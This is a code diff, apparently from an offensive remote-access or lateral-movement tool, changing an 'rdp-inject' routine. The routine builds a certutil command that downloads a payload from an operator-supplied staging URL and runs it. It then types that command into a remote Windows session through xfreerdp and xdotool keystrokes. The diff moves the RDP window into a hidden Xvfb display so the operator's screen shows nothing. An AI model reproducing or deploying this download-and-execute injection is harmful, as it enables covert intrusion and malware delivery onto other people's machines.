@@ -16533,35 +16533,38 @@ async function ipcRun(action) {
         ` ${rdpTail}`
       );
     } else if (method === 'rdp-inject') {
-      // GUI injection: xfreerdp con ventana visible + xdotool Win+R + xclip paste + Enter.
-      // Evita el problema de /shell: ignorado por el servidor y el de FUSE en rdp-drive.
-      // xclip en lugar de xdotool type porque xdotool type pierde las barras inversas en paths Windows.
+      // GUI injection via xdotool Win+R — runs in a headless Xvfb virtual display
+      // so the RDP window never appears on the operator's real screen.
+      // xclip writes to the virtual display clipboard; xdotool targets the same display.
       if (!surl) { toast('Enter Staging URL', 'error'); return; }
       const winCmd    = `cmd /c certutil -urlcache -split -f ${surl} ${rpath} && ${rpath}`;
-      const winCmdEsc = winCmd.replace(/'/g, "'\\''");   // escapa ' para bash single-quote
-      const rdpVis    = `${rdpBase} /w:800 /h:600 /log-level:OFF`;
+      const winCmdEsc = winCmd.replace(/'/g, "'\\''");
       const steps = [
-        `export DISPLAY=\${DISPLAY:-:1} XAUTHORITY=\${XAUTHORITY:-\$HOME/.Xauthority}`,
-        `${rdpVis} & XPID=$!`,
-        `sleep 10`,
-        `WID=$(xdotool search --pid $XPID 2>/dev/null | head -1)`,
-        `[ -z "$WID" ] && WID=$(xdotool search --class xfreerdp 2>/dev/null | tail -1)`,
-        `echo "[*] RDP window=$WID pid=$XPID"`,
-        `printf '%s' '${winCmdEsc}' | xclip -selection clipboard`,
+        `VDISP=:$(( RANDOM % 400 + 200 ))`,
+        `Xvfb "$VDISP" -screen 0 1024x768x16 &`,
+        `XVFB_PID=$!`,
         `sleep 1`,
-        `xdotool windowfocus --sync "$WID"`,
+        `DISPLAY="$VDISP" XAUTHORITY="" ${rdpBase} /w:800 /h:600 /log-level:OFF & XPID=$!`,
+        `sleep 10`,
+        `WID=$(DISPLAY="$VDISP" xdotool search --pid $XPID 2>/dev/null | head -1)`,
+        `[ -z "$WID" ] && WID=$(DISPLAY="$VDISP" xdotool search --class xfreerdp 2>/dev/null | tail -1)`,
+        `echo "[*] RDP window=$WID pid=$XPID vdisp=$VDISP"`,
+        `printf '%s' '${winCmdEsc}' | DISPLAY="$VDISP" xclip -selection clipboard`,
+        `sleep 1`,
+        `DISPLAY="$VDISP" xdotool windowfocus --sync "$WID"`,
         `sleep 0.3`,
-        `xdotool key --window "$WID" Escape`,
+        `DISPLAY="$VDISP" xdotool key --window "$WID" Escape`,
         `sleep 0.5`,
-        `xdotool key --window "$WID" super+r`,
+        `DISPLAY="$VDISP" xdotool key --window "$WID" super+r`,
         `sleep 2`,
-        `xdotool key --window "$WID" ctrl+a`,
+        `DISPLAY="$VDISP" xdotool key --window "$WID" ctrl+a`,
         `sleep 0.3`,
-        `xdotool key --window "$WID" ctrl+v`,
+        `DISPLAY="$VDISP" xdotool key --window "$WID" ctrl+v`,
         `sleep 0.5`,
-        `xdotool key --window "$WID" Return`,
+        `DISPLAY="$VDISP" xdotool key --window "$WID" Return`,
         `sleep 10`,
         `kill $XPID 2>/dev/null`,
+        `kill $XVFB_PID 2>/dev/null`,
         `echo "[+] rdp-inject done"`,
       ];
       cmds.push(`( ${steps.join('; ')} )`);
